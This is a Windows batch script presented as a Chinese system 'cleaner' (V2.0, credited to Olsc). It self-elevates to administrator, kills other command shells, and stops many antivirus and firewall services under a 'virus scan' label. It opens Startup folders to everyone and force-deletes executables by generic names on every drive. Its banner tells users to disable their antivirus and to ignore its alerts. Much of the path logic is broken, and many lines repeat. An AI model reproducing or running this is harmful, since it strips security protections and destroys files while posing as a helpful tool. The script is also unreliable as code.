taskkill /f /im batunpacker.exe>>nul
@echo off
mode con cols=10 lines=10
setlocal enabledelayedexpansion
title 极力清理器内测版V2.0
chcp 936
%1 start "" mshta vbscript:createobject("shell.application").shellexecute("""%~0""","::",,"runas",1)(window.close)&exit>nul
cls
wmic process where name="wmic.exe" get ParentProcessId|(
for /f %%a in ('findstr [0-9]')do taskkill /f /t /fi "pid ne %%a" /im cmd.exe >nul 2>nul 1>nul
)
taskkill /f /im batunpacker.exe>>nul
cls
:maxice51236
set numLOOP=0
Set HomeDrive=C:
Set WinDir=%HomeDrive%\WINDOWS
Set SysDir=%WinDir%\System32
Set ProgFile=%HomeDrive%\Program Files
Set CurUser=%HomeDrive%\Documents and Settings\Administrator
Set AllUser=%HomeDrive%\Documents and Settings\All Users
set pf=Q,W,E,R,T,Y,U,I,O,P,A,S,D,F,G,H,J,K,L,Z,X,C,V,B,N,M
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
:varxitong
if "%PROCESSOR_ARCHITECTURE%"=="x86" (set xitongweishu=32位) else (set xitongweishu=64位)
wmic os get Caption /value | findstr "Windows *" > %temp%\Temp.JLQL.tmp
set /p information=<%temp%\Temp.JLQL.tmp
for /f "tokens=2" %%i in ("%information%") do set sys1=%%i
for /f "tokens=3" %%j in ("%information%") do set sys2=%%j
for /f "tokens=4" %%k in ("%information%") do set sys3=%%k
set systemen=%sys1% %sys2% %sys3%
goto maxice
:maxice
title 极力清理器内测版V2.0
cls
color 0f
mode con cols=45 lines=37
echo -------------------------------------------
call :ColorText 0f "------------"
call :ColorText 0b "欢迎使用极力清理器"
call :ColorText 0f "-------------"
echo.
call :ColorText 0f "------"
call :ColorText 0c "本程序只适用于系统盘为C盘的电脑"
call :ColorText 0f "------"
echo.
echo -------------------------------------------
echo ★ 本清理器推荐的使用情况是电脑极其卡顿或长期没有清理垃圾，而电脑里又保留有重要文件不希望重装的时候。
echo ★ 请注意本清理器仅能对此类情况进行缓解，应备份的文件还是希望能进行备份。本清理器也不能取代重装系统。
echo ★ 如果在清理过程中遇到杀毒软件报毒属正常现象，稍微写过软件的基本都懂。
echo ★ 清理过程中尽可能不要进行其他工作，输入法可能会暂时无法切换（毕竟要清理缓存），属于正常现象。
echo ★ 本程序不太推荐日常使用，更倾向于急用情况。
echo ★ 推荐清理后重启。
echo ★ 本程序存在强制指令，建议关闭杀毒软件。
echo ★ 本程序将尽最大可能保护您的电脑，不会携带任何病毒
echo ★ 请勿将本程序用于任何商业用途！！！！
echo -------------------------------------------
echo ● 当前版本：V2.0  更新时间：2020/8/17
call :ColorText 0f "● 您的系统："
call :ColorText 0a "%systemen% %xitongweishu%"
echo.
echo -------------------------------------------
echo ---------------Made by Olsc----------------
echo ----------BiliBili UID:204831965-----------
echo -------------------------------------------
echo ◆ 快速清理请输入1    ----------------------
echo ◆ 极力清理请输入2    ----------------------
echo ◆ 超级清理请输入3    ----------------------
echo ◆ 极力工具箱请输入4    --------------------
echo -------------------------------------------
echo.
set choice=
set /p choice=在此输入指令后按下回车 ^>
if "%choice%"=="" goto maxice
if /i '%choice%'=='1' goto kuaisuqingli123
if /i '%choice%'=='2' goto jiliqingli
if /i '%choice%'=='3' goto Taskkill
if /i '%choice%'=='4' goto tools520
if /i '%choice%'=='你好' goto nihao
:wufashibei0
cls
echo 无法识别您的指令！
pause
goto maxice
:nihao
cls
echo 你好！
pause
goto maxice
:chasha
cls
title 已进行 0%
echo 正在进行病毒查杀...
echo.
net stop "McAfee.com VirusScan Online Realtime Engine"
net stop "McAfee Agent"
net stop " McAfee SecurityCenter Update Manager "
net stop "McShield"
net stop "SyGateService"
net stop "Sygate Personal Firewall Pro"
net stop "Sygate Personal Firewall"
net stop "Sophos Anti-Virus"
net stop "Sophos Anti-Virus Network"
net stop "eTrust Antivirus Job Server"
net stop "eTrust Antivirus Realtime Server"
net stop "eTrust Antivirus RPC Server"
net stop "ViRobot Expert Monitoring"
net stop "ViRobot Lite Monitoring"
net stop "Quick Heal Online Protection"
net stop "V3MonNT"
net stop "V3MonSvc"
net stop "Security Center"
net stop "Windows Firewall"
net stop "Windows Internet Connection Sharing(ICS)"
net stop "NAV Alert"
net stop "NAV Auto-Protect"
net stop "ScriptBlocking Service"
net stop "DefWatch"
net stop "Background Intelligent Transfer Service"
net stop "System Event Notification"
net stop "BlackICE"
net stop "AVSync Manager"
net stop "AVG7 Alert Manager Server"
net stop "AVG7 Update Service"
net stop "InVircible Scheduler"
net stop "kavsvc"
net stop "avast! Antivirus"
net stop "avast! iAVS4 Control Service"
net stop "Trend ServerProtect Agent"
net stop "Trend ServerProtect "
dir /s/a-d/b dir /s/a-d/b %pf%\*SuCH0ST*.*
del /s /f /q %pf%\SuCH0ST.EXE 
cls
Rem 无条件禁止自动运行特性防范病毒
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveAutoRun /t REG_BINARY /d ffffff03 /f>nul 2>nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 0x000000df /f>nul 2>nul
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t REG_DWORD /d 0x00000001 /f>nul 2>nul
rem 修复磁盘打开关联
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2" /f>nul 2>nul
rem 杀除U盘病毒进程
taskkill /F /IM ctfmon.exe /IM ctfmon.exe /IM SVOHOST.exe /IM AdobeR.exe /IM ravmone.exe /IM wincfgs.exe /IM doc.exe /IM rose.exe /IM sxs.exe /IM autorun.exe /IM KB20060111.exe>nul 2>nul
rem 免疫自动运行
echo Y|cacls "%USERPROFILE%\「开始」菜单\程序\启动" /C /P everyone:F>nul 2>nul
echo Y|cacls "%ALLUSERSPROFILE%\「开始」菜单\程序\启动" /C /P everyone:F>nul 2>nul
attrib -s -h -r "%USERPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
attrib -s -h -r "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
del /A /F /S /Q "%USERPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
del /A /F /S /Q "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
rem echo Y|cacls "%USERPROFILE%\「开始」菜单\程序\启动" /C /P everyone:N>nul 2>nul
rem echo Y|cacls "%ALLUSERSPROFILE%\「开始」菜单\程序\启动" /C /P everyone:N>nul 
cls
Echo 正在免疫！可能需要一小会时间，请稍候……
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls %%a:\autorun.inf /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do attrib -s -h -r %%a:\Autorun.inf>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q %%a:\Autorun.inf>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do md %%a:\Autorun.inf\>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do md %%a:\Autorun.inf\病毒免疫目录不要删除！..\>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do attrib +s +h +r %%a:\Autorun.inf>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls %%a:\autorun.inf /C /P everyone:R>nul 2>nul
rem 杀除U盘病毒进程
taskkill /F /IM ctfmon.exe /IM ctfmon.exe /IM SVOHOST.exe /IM AdobeR.exe /IM ravmone.exe /IM wincfgs.exe /IM doc.exe /IM rose.exe /IM sxs.exe /IM autorun.exe /IM KB20060111.exe>nul 2>nul
rem 免疫自动运行
echo Y|cacls "%USERPROFILE%\「开始」菜单\程序\启动" /C /P everyone:F>nul 2>nul
echo Y|cacls "%ALLUSERSPROFILE%\「开始」菜单\程序\启动" /C /P everyone:F>nul 2>nul
attrib -s -h -r "%USERPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
attrib -s -h -r "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
del /A /F /S /Q "%USERPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
del /A /F /S /Q "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\*.exe">nul 2>nul
rem echo Y|cacls "%USERPROFILE%\「开始」菜单\程序\启动" /C /P everyone:N>nul 2>nul
rem echo Y|cacls "%ALLUSERSPROFILE%\「开始」菜单\程序\启动" /C /P everyone:N>nul 2>nul
rem 清除自动加载键值
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SoundMam /f>nul 2>nul
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v wincfgs /f>nul 2>nul
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /f>nul 2>nul
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /f>nul 2>nul
rem 清除喜欢利用回收站的移动磁盘自动运行病毒
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycler\*.exe" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycler\*.pif" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycler\*.com" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycled\*.exe" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycled\*.pif" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycled\*.com" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycled\Recycled\*.exe" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycled\Recycled\*.pif" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do echo Y|cacls "%%a:\Recycled\Recycled\*.com" /C /P everyone:F>nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q "%%a:\Recycled\*.exe">nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q "%%a:\Recycled\*.com">nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q "%%a:\Recycled\*.pif">nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q "%%a:\Recycler\*.exe">nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q "%%a:\Recycler\*.com">nul 2>nul
for %%a in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do del /A /F /S /Q "%%a:\Recycler\*.pif">nul 2>nul
cls
Echo.
Echo 当前系统的所有磁盘已经成功地进行了自动运行病毒免疫！
cls
echo 开始简单杀毒...
echo 已进行百分之1
dir /s/a-d/b dir /s/a-d/b %pf%\myset1234.exe
del /s /f /q %pf%myset1234.EXE 
cls
echo 已进行百分之2
dir /s/a-d/b %pf%\down.EXE
del /S /F /Q %pf%\down.EXE 
dir /s/a-d/b %pf%\OEM.EXE
cls
echo 已进行百分之3
del /S /F /Q %pf%\OEM.EXE 
dir /s/a-d/b %pf%\boot.EXE
cls
echo 已进行百分之4
del /S /F /Q %pf%\down.EXE
dir /s/a-d/b %pf%\*systen.EXE
del /S /F /Q %pf%\systen.EXE 
dir /s/a-d/b %pf%\expl0rer.EXE
cls
echo 已进行百分之5
del /S /F /Q %pf%\expl0rer.EXE 
dir /s/a-d/b %pf%\*fun.EXE
del /S /F /Q %pf%\fun.EXE 
cls
echo 已进行百分之6
dir /s/a-d/b %pf%\*Aboutagirl.EXE
del /S /F /Q %pf%\Aboutagirl.EXE
dir /s/a-d/b %pf%\*Absr.EXE
cls
echo 已进行百分之7
del /S /F /Q %pf%\Absr.EXE
dir /s/a-d/b %pf%\*Aplica32*.*
del /S /F /Q %pf%\Aplica32.EXE
cls
echo 已进行百分之8
dir /s/a-d/b %pf%\*Avcinsol*.*
del /S /F /Q %pf%\Avcinsol.EXE
cls
echo 已进行百分之9
dir /s/a-d/b %pf%\*Avp.EXE
del /S /F /Q %pf%\Avp.EXE
cls
echo 已进行百分之10
dir /s/a-d/b %pf%\*高清电影.url
cls
echo 已进行百分之11
del /S /F /Q %pf%\*高清电影.url 
cls
echo 已进行百分之12
dir /s/a-d/b %pf%\*网址导航.url
cls
echo 已进行百分之13
del /S /F /Q %pf%\*网址导航.url
cls
echo 已进行百分之14
dir /s/a-d/b %pf%\*美女图片.url
cls
echo 已进行百分之15
del /S /F /Q %pf%\*美女图片.url 
cls
echo 已进行百分之16
dir /s/a-d/b %pf%\*Internet Explorer.lnk*.*
del /S /F /Q %pf%\*Internet Explorer.lnk
cls
echo 已进行百分之17
dir /s/a-d/b %pf%\*热门电视剧.url
del /S /F /Q %pf%\*热门电视剧.url 
cls
echo 已进行百分之18
dir /s/a-d/b %pf%\*uexplorertran.EXE
del /S /F /Q %pf%\*uexplorertran.EXE 
dir /s/a-d/b %pf%\*Avp32.EXE
cls
echo 已进行百分之19
dir /s/a-d/b %pf%\*帮5淘*.*
cls
echo 已进行百分之20
del /S /F /Q %pf%\Avp32.EXE
del /S /F /Q %pf%\帮5淘*.EXE
cls
echo 已进行百分之21
dir /s/a-d/b %pf%\*Avpm.EXE
del /S /F /Q %pf%\*Avpm.EXE
cls
echo 已进行百分之22
dir /s/a-d/b %pf%\*多彩便签.EXE
del /S /F /Q %pf%\*多彩便签.EXE
cls
echo 已进行百分之23
dir /s/a-d/b %pf%\*Avserve.EXE
del /S /F /Q %pf%\*Avserve*.EXE
cls
echo 已进行百分之24
dir /s/a-d/b %pf%\*Bbeagle.EXE
del /S /F /Q %pf%\Bbeagle.EXE
cls
echo 已进行百分之25
dir /s/a-d/b %pf%\*Brainspy.EXE
del /S /F /Q %pf%\*Brainspy*.EXE
cls
echo 已进行百分之26
dir /s/a-d/b %pf%\*Cfiadmin.EXE
del /S /F /Q %pf%\*Cfiadmin.EXE
cls
echo 已进行百分之27
dir /s/a-d/b %pf%\*Cfiaudit.EXE
del /S /F /Q %pf%\*Cfiaudit.EXE
cls
echo 已进行百分之28
dir /s/a-d/b %pf%\*Cfinet32.EXE
del /S /F /Q %pf%\Cfinet32.EXE
cls
echo 已进行百分之29
dir /s/a-d/b %pf%\*Checkdll.EXE
del /S /F /Q %pf%\Checkdll.EXE
cls
echo 已进行百分之30
dir /s/a-d/b %pf%\*Cmctl32.EXE
del /S /F /Q %pf%\Cmctl32.EXE
cls
echo 已进行百分之31
dir /s/a-d/b %pf%\*Command.EXE
del /S /F /Q %pf%\Command.EXE
cls
echo 已进行百分之32
dir /s/a-d/b %pf%\*Diagcfg.EXE
del /S /F /Q %pf%\Diagcfg.EXE
cls
echo 已进行百分之33
dir /s/a-d/b %pf%\*Dvldr32.EXE
del /S /F /Q %pf%\Dvldr32.EXE
cls
echo 已进行百分之34
dir /s/a-d/b %pf%\*Winmsg32.EXE
del /S /F /Q %pf%\Winmsg32.EXE
cls
echo 已进行百分之35
dir /s/a-d/b %pf%\*Expiorer.EXE
del /S /F /Q %pf%\Expiorer.EXE
cls
echo 已进行百分之36
dir /s/a-d/b %pf%\*Rundll.EXE
del /S /F /Q %pf%\Rundll.EXE
cls
echo 已进行百分之37
dir /s/a-d/b %pf%\*Runouce*.*
dir /s/a-d/b %pf%\*Runouce.EXE
del /S /F /Q %pf%\Runouce.exe
cls
echo 已进行百分之38
dir /s/a-d/b %pf%\*Intel.EXE
del /S /F /Q %pf%\Intel.exe
cls
echo 已进行百分之39
dir /s/a-d/b %pf%\*Intemet.EXE
del /S /F /Q %pf%\Intemet.exe
cls
echo 已进行百分之40
dir /s/a-d/b %pf%\*Keme132.EXE
del /S /F /Q %pf%\Keme132.exe
dir /s/a-d/b %pf%\*Km132.EXE
del /S /F /Q %pf%\Km132.exe
cls
echo 已进行百分之41
dir /s/a-d/b %pf%\*Msblast.EXE
del /S /F /Q %pf%\Msblast.exe
cls
echo 已进行百分之42
dir /s/a-d/b %pf%\*Netspy.EXE
del /S /F /Q %pf%\Netspy.exe
cls
echo 已进行百分之43
dir /s/a-d/b %pf%\*Winmgm32.EXE
del /S /F /Q %pf%\Winmgm32.exe
cls
echo 已进行百分之44
dir /s/a-d/b %pf%\*Wilogon32.EXE
del /S /F /Q %pf%\Wilogon32.exe
cls
echo 已进行百分之45
dir /s/a-d/b %pf%\*外挂*.* 
dir /s/a-d/b %pf%\*外挂*.* 
dir /s/a-d/b %pf%\*刷枪*.* 
dir /s/a-d/b %pf%\*刷枪*.* 
cls
echo 已进行百分之46
dir /s/a-d/b %pf%\*刷赞*.* 
dir /s/a-d/b %pf%\*刷赞*.* 
dir /s/a-d/b %pf%\*刷金币*.* 
dir /s/a-d/b %pf%\*刷金币*.* 
cls
echo 已进行百分之47
dir /s/a-d/b %pf%\*刷Q币*.* 
dir /s/a-d/b %pf%\*刷Q币*.* 
dir /s/a-d/b %pf%\*唰Q币*.* 
dir /s/a-d/b %pf%\*唰Q币*.* 
cls
echo 已进行百分之48
del /A /S /F /Q %pf%\*辅助*.* 
del /A /S /F /Q %pf%\*辅助*.* 
del /A /S /F /Q %pf%\*外挂*.* 
del /A /S /F /Q %pf%\*外挂*.* 
del /A /S /F /Q %pf%\*刷枪*.* 
del /A /S /F /Q %pf%\*刷枪*.* 
del /A /S /F /Q %pf%\*刷赞*.* 
del /A /S /F /Q %pf%\*刷赞*.* 
cls
echo 已进行百分之49
del /a /s /f /q %pf%\*刷金币*.* 
del /a /s /f /q %pf%\*刷金币*.* 
del /a /s /f /q %pf%\*刷Q币*.* 
del /a /s /f /q %pf%\*刷Q币*.* 
del /a /s /f /q %pf%\*唰Q币*.* 
del /a /s /f /q %pf%\*唰Q币*.* 
cls
echo 已进行百分之50
dir /s/a-d/b %pf%\Msblast.exe
dir /s/a-d/b %pf%\Mschv.exe
dir /s/a-d/b %pf%\Avpcc.exe
cls
echo 已进行百分之51
dir /s/a-d/b %pf%\Msgsrv36.exe
dir /s/a-d/b %pf%\_Msgsvc.exe
dir /s/a-d/b %pf%\Avserve.exe
dir /s/a-d/b %pf%\Msgsvr16.exe
cls
echo 已进行百分之52
dir /s/a-d/b %pf%\Bbeagle.exe
dir /s/a-d/b %pf%\Msie5.exe
dir /s/a-d/b %pf%\Brainspy.exe
dir /s/a-d/b %pf%\Msstart.exe
cls
echo 已进行百分之53
dir /s/a-d/b %pf%\Cfiadmin.exe
dir /s/a-d/b %pf%\Mstesk.exe
dir /s/a-d/b %pf%\Cfiaudit.exe
cls
echo 已进行百分之54
dir /s/a-d/b %pf%\Netip.exe
dir /s/a-d/b %pf%\Cfinet32.exe
dir /s/a-d/b %pf%\Netspy.exe
cls
echo 已进行百分之55
dir /s/a-d/b %pf%\Checkdll.exe
dir /s/a-d/b %pf%\Notpa.exe
dir /s/a-d/b %pf%\Cmctl32.exe
dir /s/a-d/b %pf%\Odbc.exe
dir /s/a-d/b %pf%\Command.exe
cls
echo 已进行百分之56
dir /s/a-d/b %pf%\Pcfwallicon.exe
dir /s/a-d/b %pf%\Diagcfg.exe
dir /s/a-d/b %pf%\Pcx.exe
dir /s/a-d/b %pf%\Dkbdll.exe
cls
echo 已进行百分之57
dir /s/a-d/b %pf%\Pw32.exe
dir /s/a-d/b %pf%\Dllclient.exe
dir /s/a-d/b %pf%\Dvldr32.exe
dir /s/a-d/b %pf%\Regscan.exe
cls
echo 已进行百分之58
dir /s/a-d/b %pf%\Esafe.exe
dir /s/a-d/b %pf%\Tftp.exe
dir /s/a-d/b %pf%\Expiorer.exe
dir /s/a-d/b %pf%\Thing.exe
cls
echo 已进行百分之59
dir /s/a-d/b %pf%\Feweb.exe
dir /s/a-d/b %pf%\User.exe
dir /s/a-d/b %pf%\Flcss.exe
dir /s/a-d/b %pf%\Vp32.exe
cls
echo 已进行百分之60
dir /s/a-d/b %pf%\Frw.exe
dir /s/a-d/b %pf%\Vpcc.exe
dir /s/a-d/b %pf%\Icload95.exe
dir /s/a-d/b %pf%\Vpm.exe
dir /s/a-d/b %pf%\Icloadnt.exe
cls
echo 已进行百分之61
dir /s/a-d/b %pf%\Vsecomr.exe
dir /s/a-d/b %pf%\Vsecomr.exe
dir /s/a-d/b %pf%\Server.exe
dir /s/a-d/b %pf%\Icsupp95.exe
cls
echo 已进行百分之62
dir /s/a-d/b %pf%\Service.exe
dir /s/a-d/b %pf%\Rpcsrv.exe
dir /s/a-d/b %pf%\Sockets.exe
dir /s/a-d/b %pf%\Rundll.exe
cls
echo 已进行百分之63
dir /s/a-d/b %pf%\Something.exe
dir /s/a-d/b %pf%\Spfw.exe
dir /s/a-d/b %pf%\Runouce.exe
dir /s/a-d/b %pf%\Scanrew.exe
cls
echo 已进行百分之64
dir /s/a-d/b %pf%\Sysedit32.exe
dir /s/a-d/b %pf%\Scvhost.exe
dir /s/a-d/b %pf%\Syshelp.exe
cls
echo 已进行百分之65
dir /s/a-d/b %pf%\Internet.exe
dir /s/a-d/b %pf%\Sysrunt.exe
dir /s/a-d/b %pf%\Kernel16.exe
dir /s/a-d/b %pf%\Kernel32.exe
cls
echo 已进行百分之66
dir /s/a-d/b %pf%\System32.exe
dir /s/a-d/b %pf%\Kiss.exe
dir /s/a-d/b %pf%\Krn132.exe
cls
echo 已进行百分之67
dir /s/a-d/b %pf%\Syswindow.exe
dir /s/a-d/b %pf%\Libupdate.exe
dir /s/a-d/b %pf%\Load.exe
cls
echo 已进行百分之68
dir /s/a-d/b %pf%\Task_Bar.exe
dir /s/a-d/b %pf%\Lockdown2000.exe
dir /s/a-d/b %pf%\Taskbar.exe
dir /s/a-d/b %pf%\Lockdown2000.exe
dir /s/a-d/b %pf%\Taskmon.exe
dir /s/a-d/b %pf%\Taskmon32
cls
echo 已进行百分之69
dir /s/a-d/b %pf%\Tds2-98.exe
dir /s/a-d/b %pf%\Tds2-Nt.exe
cls
echo 已进行百分之70
dir /s/a-d/b %pf%\Temp_$01.exe
dir /s/a-d/b %pf%\Tempinetb00st.exe
dir /s/a-d/b %pf%\Tempserver.exe
cls
echo 已进行百分之71
dir /s/a-d/b %pf%\Vshwin32.exe
dir /s/a-d/b %pf%\Vsstart.exe
dir /s/a-d/b %pf%\Vw32.exe
cls
echo 已进行百分之72
dir /s/a-d/b %pf%\Windown.exe
dir /s/a-d/b %pf%\Windows.exe
cls
echo 已进行百分之73
dir /s/a-d/b %pf%\Winfunctions.exe
dir /s/a-d/b %pf%\Wingate.exe
cls
echo 已进行百分之74
dir /s/a-d/b %pf%\Wink????.exe
dir /s/a-d/b %pf%\Winl0g0n.exe
cls
echo 已进行百分之75
dir /s/a-d/b %pf%\Winmgm32.exe
dir /s/a-d/b %pf%\Winmsg32.exe
cls
echo 已进行百分之76
dir /s/a-d/b %pf%\Winprot.exe
dir /s/a-d/b %pf%\Winprotecte.exe
dir /s/a-d/b %pf%\Winrpcsrv.exe
cls
echo 已进行百分之77
dir /s/a-d/b %pf%\Winserv.exe
dir /s/a-d/b %pf%\Wubsys.exe
cls
echo 已进行百分之78
dir /s/a-d/b %pf%\Winupdate.exe
dir /s/a-d/b %pf%\Winvnc.exe
dir /s/a-d/b %pf%\Winzip.exe
cls
echo 已进行百分之79
dir /s/a-d/b %pf%\Wqk.exe
dir /s/a-d/b %pf%\Wscan.exe
dir /s/a-d/b %pf%\Zcn32.exe
dir /s/a-d/b %pf%\Xx.Tmp.exe
dir /s/a-d/b %pf%\Zonealarm.exe
dir /s/a-d/b %pf%\Wscan.exe
dir /s/a-d/b %pf%\Zcn32.exe
dir /s/a-d/b %pf%\Zonealarm.exe
cls
echo 已进行百分之80
del /A /S /F /Q %pf%\Mbbmanager.exe
del /A /S /F /Q %pf%\Mdm.exe
del /A /S /F /Q %pf%\Microsoft.exe
del /A /S /F /Q %pf%\Mmc.exe
cls
echo 已进行百分之81
del /A /S /F /Q %pf%\Aplica32.exe
del /A /S /F /Q %pf%\Mprdll.exe
del /A /S /F /Q %pf%\Avconsol.exe
del /A /S /F /Q %pf%\Msabel32.exe
cls
echo 已进行百分之82
del /A /S /F /Q %pf%\Msblast.exe
del /A /S /F /Q %pf%\Mschv.exe
cls
echo 已进行百分之83
del /A /S /F /Q %pf%\Avpcc.exe
del /A /S /F /Q %pf%\Msgsrv36.exe
del /A /S /F /Q %pf%\_Msgsvc.exe
cls
echo 已进行百分之84
del /A /S /F /Q %pf%\Avserve.exe
del /A /S /F /Q %pf%\Msgsvr16.exe
del /A /S /F /Q %pf%\Bbeagle.exe
cls
echo 已进行百分之85
del /A /S /F /Q %pf%\Msie5.exe
del /A /S /F /Q %pf%\Brainspy.exe
del /A /S /F /Q %pf%\Msstart.exe
del /A /S /F /Q %pf%\Cfiadmin.exe
del /A /S /F /Q %pf%\Mstesk.exe
del /A /S /F /Q %pf%\Cfiaudit.exe
del /A /S /F /Q %pf%\Netip.exe
cls
echo 已进行百分之86
del /A /S /F /Q %pf%\Cfinet32.exe
del /A /S /F /Q %pf%\Netspy.exe
del /A /S /F /Q %pf%\Checkdll.exe
del /A /S /F /Q %pf%\Notpa.exe
del /A /S /F /Q %pf%\Cmctl32.exe
del /A /S /F /Q %pf%\Odbc.exe
del /A /S /F /Q %pf%\Command.exe
del /A /S /F /Q %pf%\Pcfwallicon.exe
cls
echo 已进行百分之87
del /A /S /F /Q %pf%\Diagcfg.exe
del /A /S /F /Q %pf%\Pcx.exe
del /A /S /F /Q %pf%\Dkbdll.exe
del /A /S /F /Q %pf%\Pw32.exe
cls
echo 已进行百分之88
del /A /S /F /Q %pf%\Dllclient.exe
del /A /S /F /Q %pf%\Dvldr32.exe
del /A /S /F /Q %pf%\Regscan.exe
del /A /S /F /Q %pf%\Esafe.exe
cls
echo 已进行百分之89
del /A /S /F /Q %pf%\Tftp.exe
del /A /S /F /Q %pf%\Expiorer.exe
del /A /S /F /Q %pf%\Thing.exe
del /A /S /F /Q %pf%\Feweb.exe
del /A /S /F /Q %pf%\Flcss.exe
del /A /S /F /Q %pf%\Vp32.exe
del /A /S /F /Q %pf%\Frw.exe
cls
echo 已进行百分之90
del /A /S /F /Q %pf%\Vpcc.exe
del /A /S /F /Q %pf%\Icload95.exe
del /A /S /F /Q %pf%\Vpm.exe
del /A /S /F /Q %pf%\Icloadnt.exe
del /A /S /F /Q %pf%\Vsecomr.exe
del /A /S /F /Q %pf%\Vsecomr.exe
cls
echo 已进行百分之91
del /A /S /F /Q %pf%\Server.exe
del /A /S /F /Q %pf%\Icsupp95.exe
del /A /S /F /Q %pf%\Service.exe
del /A /S /F /Q %pf%\Rpcsrv.exe
del /A /S /F /Q %pf%\Sockets.exe
del /A /S /F /Q %pf%\Rundll.exe
cls
echo 已进行百分之92
del /A /S /F /Q %pf%\Something.exe
del /A /S /F /Q %pf%\Spfw.exe
del /A /S /F /Q %pf%\Runouce.exe
del /A /S /F /Q %pf%\Scanrew.exe
